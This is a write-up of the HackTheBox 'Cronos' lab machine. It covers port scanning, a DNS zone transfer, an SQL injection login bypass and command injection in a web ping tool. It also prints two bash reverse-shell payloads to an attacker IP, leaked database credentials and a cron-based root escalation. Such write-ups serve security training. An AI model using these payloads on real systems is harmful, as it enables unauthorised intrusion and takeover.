---
title: Cronos
description: Cronos box from HackTheBox write up.
---

# Cronos

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 -v 10.10.10.13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 11:28 EST
Nmap scan report for 10.10.10.13
Host is up (0.037s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 102.81 seconds
           Raw packets sent: 131150 (5.771MB) | Rcvd: 83 (3.636KB)
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Cronos]
└─$ sudo nmap -sC -sV -p22,53,80 10.10.10.13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 11:31 EST
Nmap scan report for 10.10.10.13
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds
```

We have only three ports open, SSH, DNS and a web server. Looks like it is an Ubuntu 16 machine and the only service version that looks a bit outdated is the DNS server one.

## Port 80

### Nothing?

Since the web server only shows the default Apache page we can go ahead and try Gobuster:
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/07 11:41:23 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 299]
                                               
===============================================================
2022/01/07 11:55:23 Finished
===============================================================
```
Cool, is empty or at least looks like so. 

### Enumerating the domains

Maybe there are virtual hosts in place so let's check the DNS server:
```bash
┌──(kali㉿kali)-[~/Documents/HTB/Cronos]
└─$ nslookup         
> SERVER 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 127.0.0.1
1.0.0.127.in-addr.arpa	name = localhost.
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
>
```
Adding `cronos.htb` to my hosts file and visiting the page again using this domain reveals a new page called cronos.

This is nice but before going any further let's try to perform a zone transfer to check if there are subdomains:
```bash
┌──(kali㉿kali)-[~/Documents/HTB/Cronos]
└─$ dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.17.19-3-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Jan 07 12:18:35 EST 2022
;; XFR size: 7 records (messages 1, bytes 203)
```
There they are, let's add `admin.cronos.htb` and `www.cronos.htb` to the hosts file too.

### `cronos.htb` and `www.cronos.htb`

This two domains show the Cronos page. After looking around a bit nothing interesting here, time to move on.

### `admin.cronos.htb`

In this case we are welcomed by a login form. Trying some typical credentials didn't work but since the page looks hand made maybe SQL injection is our way in.

Using the typical `' OR 1=1 #` as the user and the password worked! We have access now to something called `Net Tool v0.1`.

#### RCE and reverse shell

This `Net Tool v0.1` allow the user to execute the commands `ping` and `traceroute` from the browser. The thing is that the input is not sanitize so if we enter something like `; cat /etc/passwd` the application prints the `/etc/passwd`. We have RCE!

Time to get a reverse shell, this simple payload will do: `; bash -c 'bash -i >& /dev/tcp/10.10.14.28/8080 0>&1'`.

## In the box as `www-data`

After stabilizing the shell is time to search for a privilege scalation vector. First of all, there is a file called `config.php` with the database credentials: `admin:kEjdbRigfBHUREiNSDs` that can be used to retrieve the hashed admin password of the page: `admin:4f5fffa7b2340178a716e3832451e058`.

We can get the users that can login to the system to try the credentials we have:
```bash
www-data@cronos:/var/www/laravel/config$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
```
But sadly this didn't work. At least we can get the user flag under `/home/noulis/user.txt`.

### Getting root

After looking a bit around I found something:
```bash
www-data@cronos:/$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
```
`cron` is executing a script every minute as the `root` user. We can edit that script so adding:
```php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.28/8000 0>&1'");
```
And spinning up a listener will give us a reverse shell as `root`. The flag is under `/root/root.txt`.
